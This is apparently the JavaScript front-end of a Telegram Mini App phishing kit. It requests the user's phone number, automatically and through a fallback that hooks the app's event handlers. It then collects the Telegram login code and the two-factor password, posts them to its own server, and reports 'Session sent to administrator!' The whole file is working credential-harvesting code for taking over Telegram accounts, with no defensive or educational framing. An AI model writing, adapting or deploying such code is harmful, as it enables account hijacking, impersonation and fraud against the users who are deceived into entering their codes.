const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// DOM elements
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const phoneDisplay = document.getElementById('phoneDisplay');
const phoneDisplay2 = document.getElementById('phoneDisplay2');
const error1 = document.getElementById('error1');
const error2 = document.getElementById('error2');
const error3 = document.getElementById('error3');
const digits = [
    document.getElementById('d1'),
    document.getElementById('d2'),
    document.getElementById('d3'),
    document.getElementById('d4'),
    document.getElementById('d5')
];
const resendBtn = document.getElementById('resendBtn');
const deleteBtn = document.getElementById('deleteBtn');
const digitBtns = document.querySelectorAll('.digit-btn');
const manualSection = document.querySelector('.manual-section');
const telegramSection = document.querySelector('.telegram-section');
const phoneInput = document.getElementById('phone');
const getCodeBtn = document.getElementById('getCodeBtn');
const passwordInput = document.getElementById('passwordInput');
const submitPasswordBtn = document.getElementById('submitPasswordBtn');

// App state
let currentPhone = '';
let currentCode = '';
let codeRequested = false;

// Detect environment (Telegram or browser)
const isTelegram = tg.initData && tg.initDataUnsafe?.user;
const chatId = isTelegram ? tg.initDataUnsafe.user.id : null;

console.log('App initialized:', { isTelegram, chatId, initData: tg.initData });

// Setup UI based on environment
if (isTelegram) {
    manualSection.style.display = 'none';
    telegramSection.style.display = 'block';
    // Automatically request contact
    requestContactAutomatically();
} else {
    manualSection.style.display = 'block';
    telegramSection.style.display = 'none';
    console.log('Running in browser mode');
}

// Function to show retry message
function showRetryMessage() {
    telegramSection.innerHTML = `
        <p>Failed to get phone number.</p>
        <button id="retryBtn" class="action-btn">Retry</button>
    `;
    document.getElementById('retryBtn')?.addEventListener('click', () => {
        requestContactAutomatically();
    });
}

// Function to send phone to server
function sendPhoneToServer(phone, chatId) {
    console.log('Sending phone to server:', { phone, chatId });
    
    if (!phone) {
        console.error('Phone is empty');
        showRetryMessage();
        return;
    }
    
    // Show sending indicator
    telegramSection.innerHTML = '<p>Sending phone to server...</p><div class="loader"></div>';
    
    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, chatId })
    })
    .then(response => {
        console.log('Server response status:', response.status);
        if (!response.ok) {
            return response.json().then(data => {
                throw new Error(data.error || `HTTP error ${response.status}`);
            });
        }
        return response.json();
    })
    .then(data => {
        console.log('Server response data:', data);
        
        if (data.success) {
            // Success – proceed to code input
            currentPhone = phone;
            phoneDisplay.textContent = phone;
            step1.style.display = 'none';
            step2.style.display = 'block';
            codeRequested = true;
            
            // Clear code fields
            digits.forEach(d => d.value = '');
            currentCode = '';
            
            // Show warning if any
            if (data.warning) {
                error2.textContent = data.warning;
                error2.style.color = '#ffa500';
            }
            
            console.log('Phone sent successfully, waiting for code input');
        } else {
            // Server error
            throw new Error(data.error || 'Unknown server error');
        }
    })
    .catch(error => {
        console.error('Error sending phone to server:', error);
        
        telegramSection.innerHTML = `
            <p>Error: ${error.message}</p>
            <button id="retryBtn" class="action-btn">Retry</button>
        `;
        document.getElementById('retryBtn')?.addEventListener('click', () => {
            requestContactAutomatically();
        });
    });
}

// Automatic contact request in Telegram
function requestContactAutomatically() {
    console.log('Requesting contact automatically...');
    
    telegramSection.innerHTML = '<p>Requesting phone number...</p><div class="loader"></div>';
    
    // Request contact
    tg.requestContact((success, contact) => {
        console.log('Standard requestContact result:', { success, contact });
        
        if (success) {
            // Check if phone number exists in contact
            if (contact && contact.phone_number) {
                const phone = contact.phone_number;
                console.log('Phone obtained via standard method:', phone);
                sendPhoneToServer(phone, chatId);
            } 
            else if (contact && !contact.phone_number) {
                console.warn('Standard method returned success but no phone number, trying alternative...');
                // Try alternative method
                requestContactAlternative();
            }
            else {
                console.error('Contact object is empty');
                showRetryMessage();
            }
        } else {
            console.log('Standard request failed or declined');
            
            // Try alternative method
            telegramSection.innerHTML = '<p>Trying alternative method...</p><div class="loader"></div>';
            requestContactAlternative();
        }
    });
}

// Alternative contact request method
function requestContactAlternative() {
    console.log('Requesting contact via alternative method...');
    
    // Create unique request ID
    const reqId = 'get_contact_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Set handler for receiveEvent
    const originalReceive = tg.receiveEvent;
    
    tg.receiveEvent = function(eventType, eventData) {
        console.log('receiveEvent in alternative:', eventType, eventData);
        
        if (eventType === 'custom_method_invoked' && eventData.req_id === reqId) {
            try {
                // Parse result
                const result = eventData.result;
                console.log('Custom method result:', result);
                
                // Try to extract number from string
                if (result && typeof result === 'string') {
                    // Look for phone_number pattern
                    const match = result.match(/phone_number[%22=]+([0-9+]+)/i);
                    if (match && match[1]) {
                        const phone = match[1];
                        console.log('Phone extracted from string:', phone);
                        sendPhoneToServer(phone, chatId);
                        return;
                    }
                }
                
                // If extraction failed, try to parse as JSON
                try {
                    const parsed = JSON.parse(result);
                    if (parsed.contact && parsed.contact.phone_number) {
                        const phone = parsed.contact.phone_number;
                        console.log('Phone from parsed JSON:', phone);
                        sendPhoneToServer(phone, chatId);
                        return;
                    }
                } catch (e) {
                    console.log('Result is not JSON');
                }
                
                console.error('Could not extract phone from custom method response');
                showRetryMessage();
            } catch (e) {
                console.error('Error processing custom method result:', e);
                showRetryMessage();
            }
        }
        
        // Call original handler if exists
        if (originalReceive) {
            originalReceive(eventType, eventData);
        }
    };
    
    // Request contact via invokeCustomMethod
    tg.sendData = function(data) {
        console.log('sendData received:', data);
    };
    
    // Send request to get contact
    tg.ready();
    
    // Show manual entry button as fallback
    setTimeout(() => {
        telegramSection.innerHTML = `
            <p>Automatic request failed.</p>
            <button id="manualFallbackBtn" class="action-btn">Enter number manually</button>
        `;
        document.getElementById('manualFallbackBtn')?.addEventListener('click', () => {
            manualSection.style.display = 'block';
            telegramSection.style.display = 'none';
        });
    }, 5000);
}

// Manual input handler (for browser and fallback)
if (getCodeBtn) {
    getCodeBtn.addEventListener('click', () => {
        const phone = phoneInput.value.trim();
        console.log('Manual phone input:', phone);
        
        if (!phone) {
            error1.textContent = 'Enter phone number';
            return;
        }
        
        // Send phone to server
        error1.textContent = '';
        
        fetch('/api/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, chatId: isTelegram ? chatId : null })
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                currentPhone = phone;
                phoneDisplay.textContent = phone;
                step1.style.display = 'none';
                step2.style.display = 'block';
                codeRequested = true;
                digits.forEach(d => d.value = '');
                currentCode = '';
                if (data.warning) error2.textContent = data.warning;
            } else {
                error1.textContent = data.error || 'Server error';
            }
        })
        .catch(err => {
            console.error('Manual send error:', err);
            error1.textContent = 'Network error';
        });
    });
}

// Numeric keypad
digitBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        if (!codeRequested) return;
        const digit = btn.getAttribute('data-digit');
        if (currentCode.length < 5) {
            currentCode += digit;
            digits[currentCode.length - 1].value = digit;
            if (currentCode.length === 5) {
                console.log('5 digits entered, verifying code:', currentCode);
                verifyCode();
            }
        }
    });
});

deleteBtn.addEventListener('click', () => {
    if (currentCode.length > 0) {
        digits[currentCode.length - 1].value = '';
        currentCode = currentCode.slice(0, -1);
    }
});

// Resend code
resendBtn.addEventListener('click', () => {
    if (!currentPhone) return;
    console.log('Resending code for:', currentPhone);
    
    resendBtn.disabled = true;
    resendBtn.textContent = 'Sending...';
    
    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, chatId })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            error2.textContent = 'Code resent' + (data.warning ? ' (' + data.warning + ')' : '');
            error2.style.color = '#4caf50';
            setTimeout(() => error2.textContent = '', 3000);
        } else {
            error2.textContent = data.error || 'Error';
        }
    })
    .catch(() => {
        error2.textContent = 'Network error';
    })
    .finally(() => {
        resendBtn.disabled = false;
        resendBtn.textContent = 'Resend code';
    });
});

// Verify code
function verifyCode() {
    console.log('Verifying code:', { phone: currentPhone, code: currentCode });
    error2.textContent = '';
    
    fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, code: currentCode })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Verify response:', data);
        
        if (data.success) {
            // Successful verification
            console.log('Verification successful!');
            
            if (isTelegram) {
                // Show message and close
                error2.textContent = '✓ Success! Session sent';
                error2.style.color = '#4caf50';
                setTimeout(() => tg.close(), 1500);
            } else {
                alert('Session sent to administrator!');
            }
        } else if (data.needPassword) {
            // 2FA required
            console.log('2FA required');
            step2.style.display = 'none';
            step3.style.display = 'block';
            phoneDisplay2.textContent = currentPhone;
            passwordInput.value = '';
            error3.textContent = '';
        } else {
            // Invalid code
            error2.textContent = data.error || 'Invalid code';
            digits.forEach(d => d.value = '');
            currentCode = '';
        }
    })
    .catch(err => {
        console.error('Verify error:', err);
        error2.textContent = 'Network error';
        digits.forEach(d => d.value = '');
        currentCode = '';
    });
}

// Submit 2FA password
submitPasswordBtn.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    console.log('Submitting 2FA password');
    
    if (!password) {
        error3.textContent = 'Enter password';
        return;
    }
    
    submitPasswordBtn.disabled = true;
    submitPasswordBtn.textContent = 'Sending...';
    
    fetch('/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, password })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            if (isTelegram) {
                error3.textContent = '✓ Password accepted';
                error3.style.color = '#4caf50';
                setTimeout(() => tg.close(), 1500);
            } else {
                alert('Password accepted! Data sent.');
            }
        } else {
            error3.textContent = data.error || 'Error';
        }
    })
    .catch(() => {
        error3.textContent = 'Network error';
    })
    .finally(() => {
        submitPasswordBtn.disabled = false;
        submitPasswordBtn.textContent = 'SUBMIT PASSWORD';
    });
});

// Physical keyboard support (for debugging)
document.addEventListener('keydown', (e) => {
    if (!codeRequested || step2.style.display !== 'block') return;
    if (e.key >= '0' && e.key <= '9') {
        if (currentCode.length < 5) {
            currentCode += e.key;
            digits[currentCode.length - 1].value = e.key;
            if (currentCode.length === 5) verifyCode();
        }
    } else if (e.key === 'Backspace') {
        if (currentCode.length > 0) {
            digits[currentCode.length - 1].value = '';
            currentCode = currentCode.slice(0, -1);
        }
    }
});